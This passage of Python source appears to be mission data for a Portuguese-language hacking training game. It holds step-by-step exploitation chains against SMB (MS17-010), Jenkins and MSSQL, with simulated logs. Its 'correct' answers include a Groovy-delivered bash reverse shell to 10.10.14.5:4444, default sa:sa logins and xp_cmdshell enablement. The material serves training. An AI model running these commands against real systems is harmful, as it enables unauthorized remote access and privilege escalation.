                "success_logs": "[*] Started reverse TCP handler on 10.10.14.5:4444\n[*] {ip}:445 - Connecting to target for exploitation.\n[+] {ip}:445 - Connection established for exploitation.\n[*] {ip}:445 - Target OS selected valid for OS indicated by SMB reply\n[*] {ip}:445 - CORE raw buffer dump (42 bytes)\n[+] {ip}:445 - Target is vulnerable to MS17-010!\n[*] {ip}:445 - Sending exploit shellcode...\n[*] Sending stage (200774 bytes) to {ip}\n[*] Meterpreter session 1 opened (10.10.14.5:4444 -> {ip}:49158)\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM", 
                "fatal_logs": {}, 
                "fail_logs": {"nc {ip} 445": {"msg": "Conectar com netcat no SMB não dá shell. O protocolo é binário complexo.", "risk": 15}}, 
                "teach": "PWNED! O Metasploit enviou pacotes malformados que corromperam a memória do kernel do Windows, injetando nosso payload. Temos acesso nível SYSTEM (acima do Administrador)."
            }
        ]
    },

    # ============================================
    # NÍVEL 4: GOV.SIMULATION.BR (Expert)
    # ============================================
    
    8080: {
        "name": "Jenkins (RCE via Groovy Script)",
        "tool": "METASPLOIT / MANUAL",
        "desc": "Jenkins mal configurado permite execução de scripts Groovy sem autenticação, levando a RCE completo.",
        "img": "jenkins",
        "xp_reward": 250,
        "steps": [
            {
                "phase": "DESCOBERTA", 
                "context": "Identifique se há um servidor Jenkins rodando na porta 8080.", 
                "options": ["curl -I http://{ip}:8080", "nmap -p 8080 {ip}", "nc {ip} 8080"], 
                "correct": "curl -I http://{ip}:8080", 
                "success_logs": "HTTP/1.1 200 OK\nX-Jenkins: 2.319.1\nX-Jenkins-Session: 1a2b3c4d\nContent-Type: text/html;charset=utf-8", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Jenkins 2.319.1 detectado! O header X-Jenkins revela a versão. Jenkins é uma ferramenta de CI/CD muito usada em empresas."
            },
            {
                "phase": "ENUMERAÇÃO", 
                "context": "Vamos verificar se o Jenkins requer autenticação ou está aberto.", 
                "options": ["curl http://{ip}:8080/script", "curl http://{ip}:8080/login", "nikto -h {ip}:8080"], 
                "correct": "curl http://{ip}:8080/script", 
                "success_logs": "HTTP/1.1 200 OK\n\n<html><head><title>Script Console</title></head>\n<body>\n<h1>Groovy Script Console</h1>\n<form method='post' action='script'>\n<textarea name='script' cols='80' rows='20'></textarea>\n<input type='submit' value='Run'>\n</form>", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "FALHA CRÍTICA! O Script Console está acessível sem autenticação. Isso permite executar código Groovy arbitrário no servidor."
            },
            {
                "phase": "TESTE DE RCE", 
                "context": "Vamos executar um comando simples para confirmar RCE.", 
                "options": ["curl -X POST http://{ip}:8080/script -d 'script=println \"id\".execute().text'", "curl http://{ip}:8080", "ssh {ip}"], 
                "correct": "curl -X POST http://{ip}:8080/script -d 'script=println \"id\".execute().text'", 
                "success_logs": "uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins),27(sudo)", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "RCE confirmado! O script Groovy executou o comando 'id' no servidor. Note que o usuário jenkins está no grupo sudo - possível escalação de privilégios."
            },
            {
                "phase": "REVERSE SHELL", 
                "context": "Vamos obter uma shell interativa completa.", 
                "options": ["curl -X POST http://{ip}:8080/script -d 'script=def proc=\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\".execute()'", "nc -lvnp 4444", "telnet {ip}"], 
                "correct": "curl -X POST http://{ip}:8080/script -d 'script=def proc=\"bash -i >& /dev/tcp/10.10.14.5/4444 0>&1\".execute()'", 
                "success_logs": "[*] Reverse shell payload sent\n[*] Waiting for connection on port 4444...\n[+] Connection received from {ip}:52341\njenkins@server:~$ ", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Shell obtida! Usamos Groovy para executar um comando bash que cria uma conexão reversa para nossa máquina. Agora temos controle interativo total."
            },
            {
                "phase": "ESCALAÇÃO DE PRIVILÉGIOS", 
                "context": "Vamos tentar escalar para root explorando o sudo.", 
                "options": ["sudo -l", "cat /etc/shadow", "whoami"], 
                "correct": "sudo -l", 
                "success_logs": "Matching Defaults entries for jenkins on server:\n    env_reset, mail_badpass\n\nUser jenkins may run the following commands on server:\n    (ALL : ALL) NOPASSWD: /usr/bin/docker", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Jackpot! O usuário jenkins pode executar docker como root sem senha. Isso é uma falha crítica - podemos montar o filesystem root e obter shell root."
            }
        ]
    },

    1433: {
        "name": "MSSQL (xp_cmdshell RCE)",
        "tool": "IMPACKET / MSSQLCLIENT",
        "desc": "Microsoft SQL Server com xp_cmdshell habilitado permite execução remota de comandos do sistema operacional.",
        "img": "sqlserver",
        "xp_reward": 250,
        "steps": [
            {
                "phase": "DESCOBERTA", 
                "context": "Verifique se o MSSQL está rodando e acessível.", 
                "options": ["nmap -p 1433 {ip}", "telnet {ip} 1433", "ping {ip}"], 
                "correct": "nmap -p 1433 {ip}", 
                "success_logs": "PORT     STATE SERVICE\n1433/tcp open  ms-sql-s", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "MSSQL detectado na porta padrão 1433. Esse banco de dados é comum em ambientes Windows corporativos."
            },
            {
                "phase": "ENUMERAÇÃO", 
                "context": "Vamos identificar a versão e configuração do MSSQL.", 
                "options": ["nmap -p 1433 --script ms-sql-info {ip}", "sqlmap -u {ip}", "nc {ip} 1433"], 
                "correct": "nmap -p 1433 --script ms-sql-info {ip}", 
                "success_logs": "| ms-sql-info:\n|   {ip}:1433:\n|     Version:\n|       name: Microsoft SQL Server 2019 RTM\n|       number: 15.00.2000.00\n|       Product: Microsoft SQL Server 2019\n|     TCP port: 1433\n|     Named pipe: \\\\{ip}\\pipe\\sql\\query", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "SQL Server 2019 identificado. Vamos tentar autenticação com credenciais padrão."
            },
            {
                "phase": "AUTENTICAÇÃO", 
                "context": "Tente conectar usando credenciais padrão ou fracas.", 
                "options": ["impacket-mssqlclient sa:sa@{ip}", "sqlcmd -S {ip} -U sa", "mysql -h {ip}"], 
                "correct": "impacket-mssqlclient sa:sa@{ip}", 
                "success_logs": "Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation\n\n[*] Encryption required, switching to TLS\n[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master\n[*] INFO(SERVER\\SQLEXPRESS): Line 1: Changed database context to 'master'.\nSQL> ", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "Autenticação bem-sucedida com sa:sa! 'sa' é a conta de administrador do SQL Server. Senha padrão é uma falha gravíssima."
            },
            {
                "phase": "HABILITAÇÃO DE xp_cmdshell", 
                "context": "Vamos habilitar o xp_cmdshell para executar comandos do SO.", 
                "options": ["EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "SELECT * FROM users;", "DROP DATABASE;"], 
                "correct": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", 
                "success_logs": "Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.\nConfiguration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "xp_cmdshell habilitado! Esse procedimento armazenado permite executar comandos do Windows diretamente do SQL. É desabilitado por padrão por razões de segurança."
            },
            {
                "phase": "EXECUÇÃO REMOTA", 
                "context": "Execute comandos do sistema operacional através do SQL.", 
                "options": ["EXEC xp_cmdshell 'whoami';", "SELECT @@version;", "SHUTDOWN;"], 
                "correct": "EXEC xp_cmdshell 'whoami';", 
                "success_logs": "output\n--------------------------------------------------------------------------------\nnt authority\\system\nNULL", 
                "fatal_logs": {}, 
                "fail_logs": {}, 
                "teach": "RCE como SYSTEM! O SQL Server roda com privilégios máximos. Podemos executar qualquer comando: criar usuários, instalar backdoors, exfiltrar dados."
            }
        ]
    }
}

# --- O MAPA DE CAMPANHA ---
MISSION_MAP = [
    {
        "id": "site_local",
        "name": "SERVIDOR DE TREINO (Localhost)",
        "desc": "Ambiente seguro para aprender os fundamentos de redes e protocolos claros.",
        "min_xp": 0,
        "ip": "127.0.0.1",
        "tools": [23, 21, 80]
    },
    {
        "id": "site_scanme",
        "name": "SCANME.NMAP.ORG",
        "desc": "Domínio público autorizado para testes. Desafios de nível júnior.",
        "min_xp": 200,
        "ip": "45.33.32.156",
        "tools": [22, 80, 443]
    },
    {
        "id": "site_corp",
        "name": "MEGACORP INTERNAL",
        "desc": "Simulação de rede corporativa. Sistemas de banco de dados e arquivos.",
        "min_xp": 600,
        "ip": "10.10.10.55",
        "tools": [3306, 445, 80, 22, 21]
    },
    {
        "id": "site_gov",
        "name": "GOV.SIMULATION.BR",
        "desc": "Sistemas críticos de alta segurança. Falhas complexas.",
        "min_xp": 1500,
        "ip": "200.10.5.1",
        "tools": [445, 22, 3306, 8080, 1433]
    }
]

# --- SISTEMA DE CONQUISTAS EXPANDIDO (KALI/HACKER THEME) ---
ACHIEVEMENTS_DB = {
    # BÁSICAS DE PROGRESSÃO
    "first_blood": {
        "name": "First Blood",
        "desc": "Complete sua primeira missão de invasão.",
        "icon": "🩸",
        "requirement": lambda stats: stats['missions'] >= 1
    },
    "script_kiddie": {
        "name": "Script Kiddie",
        "desc": "Alcance o Nível 2 e comece sua jornada no submundo.",
        "icon": "👶",
        "requirement": lambda stats: stats['level'] >= 2
    },
    
    # REFERÊNCIAS A LINUX / COMANDOS
    "sudo_permissions": {
        "name": "Sudo Permissions",
        "desc": "Alcance o Nível 5. Você não é mais um visitante no sistema.",
        "icon": "🔐",
        "requirement": lambda stats: stats['level'] >= 5
    },
    "root_access": {
        "name": "Root Access",
        "desc": "Alcance o Nível 10. O sistema pertence a você agora. #UID0",
        "icon": "⚡",
        "requirement": lambda stats: stats['level'] >= 10
    },
    "terminal_junkie": {
        "name": "Terminal Junkie",
        "desc": "Execute 100 comandos no terminal. O mouse é para os fracos.",
        "icon": "⌨️",
        "requirement": lambda stats: stats['commands'] >= 100
    },
    "bash_master": {
        "name": "Bash Master",
        "desc": "Execute 500 comandos. Você sonha em shell script.",
        "icon": "🐉", # Referência ao dragão do Kali
        "requirement": lambda stats: stats['commands'] >= 500
    },

    # HABILIDADE E STEALTH
    "ghost_operator": {
        "name": "Ghost Operator",
        "desc": "Complete uma missão com 0% de detecção IDS. Invisível.",
        "icon": "👻",
        "requirement": lambda stats: stats['perfect'] >= 1
    },
    "mr_robot": {
        "name": "Mr. Robot",
        "desc": "Complete 5 missões perfeitas. 'Hello Friend'.",
        "icon": "🎭",
        "requirement": lambda stats: stats['perfect'] >= 5
    },
    
    # CAMPANHA
    "red_team": {
        "name": "Red Team Member",
        "desc": "Complete 10 missões totais. Operador ativo.",
        "icon": "🚩",
        "requirement": lambda stats: stats['missions'] >= 10
    },
    
    # APRENDIZADO (FALHAS)
    "trial_by_fire": {
        "name": "Trial by Fire",
        "desc": "Cometa 10 erros. É caindo que se aprende a levantar.",
        "icon": "🔥",
        "requirement": lambda stats: stats['errors'] >= 10
    },
    "syntax_error": {
        "name": "RTFM (Read The Manual)",
        "desc": "Cometa 50 erros. Talvez seja hora de ler a documentação.",
        "icon": "📚",
        "requirement": lambda stats: stats['errors'] >= 50
    }
}